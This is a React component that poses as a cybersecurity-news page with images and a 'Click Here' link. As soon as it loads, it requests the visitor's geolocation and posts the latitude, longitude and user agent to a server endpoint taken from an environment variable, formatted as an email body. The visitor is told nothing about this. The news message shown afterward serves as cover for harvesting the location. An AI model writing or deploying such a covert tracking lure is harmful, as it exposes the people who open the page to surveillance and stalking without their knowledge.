import React, { useState, useEffect } from "react";

function Location() {
  const [locationInfo, setLocationInfo] = useState(null);
  const [error, setError] = useState(null);
  const [isLoading, setIsLoading] = useState(true); // Track loading state

  useEffect(() => {
    const getLocation = async () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            try {
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;
              const userAgent = navigator.userAgent;

              const emailBody = `
                <h2>Location Found!</h2>
                <p>Here's the current location:</p>
                <ul>
                  <li>Latitude: ${latitude}</li>
                  <li>Longitude: ${longitude}</li>
                </ul>
                <p>Your user agent string is: ${userAgent}</p>
              `;

              // Replace with your actual Node.js server-side endpoint URL
              const url = import.meta.env.VITE_URL;

              const response = await fetch(url, {
                method: "POST",
                body: JSON.stringify({ emailBody }),
                headers: {
                  "Content-Type": "application/json",
                },
              });

              if (response.ok) {
                setLocationInfo(
                  `Checkout the recent Cyber Attacks. Don't let threat actors manipulate your device and access your credential information.`
                );
              } else {
                setError(
                  `<h1>Oops!! an error occured, please try again later</h1>`
                );
              }
            } catch (error) {
              console.error("Error getting location:", error);
              setError(
                "There was an error getting your location. Please try again later."
              );
            } finally {
              setIsLoading(false);
            }
          },
          (error) => {
            console.error("Geolocation error:", error);
            setError("Unable to retrieve your location.");
            setIsLoading(false);
          }
        );
      } else {
        setError("Geolocation is not supported by this browser.");
        setIsLoading(false);
      }
    };

    getLocation();
  }, []);
  return (
    <div className="flex flex-col justify-center w-200  items-center mt-10 p-4 bg-black-900 shadow-md hover:shadow-lg">
      <div className="grid grid-cols-1 items-center lg:grid-cols-2 gap-2">
        <div className="flex justify-center">
          <img
            src="./image.png"
            alt="image"
            className="w-48 h-48 object-cover"
          />
        </div>

        <div className="flex justify-center">
          <img
            src="./image1.png"
            alt="image"
            className="w-48 h-48 object-cover"
          />
        </div>

        <div className="flex justify-center">
          <img
            src="./image2.png"
            alt="image"
            className="w-48 h-48 object-cover"
          />
        </div>

        <div className="flex justify-center">
          <img
            src="./image3.png"
            alt="image"
            className="w-48 h-48 object-cover"
          />
        </div>
      </div>

      {isLoading && <p>Loading...</p>}
      {locationInfo && (
        <div className="flex flex-col items-center">
          <h1 className="text-3xl">
            Get Updated with the cybersecurity attacks today..
          </h1>
          <h3 className="success">{locationInfo}</h3>
          <strong className="text-blue-500 hover:text-blue-900 curser-pointer">
            <a href="https://zsecurity.org/" target="_blank">
              Click Here
            </a>
          </strong>
        </div>
      )}
      {error && <p className="error">{error}</p>}
    </div>
  );
}

export default Location;
